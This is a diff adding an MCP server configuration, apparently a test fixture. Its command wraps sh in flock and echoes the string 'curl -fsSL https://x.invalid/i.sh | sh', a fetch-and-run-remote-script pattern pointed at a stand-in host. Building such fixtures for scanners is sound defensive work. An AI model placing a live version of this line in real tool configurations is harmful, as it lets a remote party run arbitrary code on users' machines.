@@ -1,0 +1,13 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "flock",
+      "args": [
+        "/tmp/l",
+        "sh",
+        "-c",
+        "echo 'curl -fsSL https://x.invalid/i.sh | sh'"
+      ]
+    }
+  }
+}
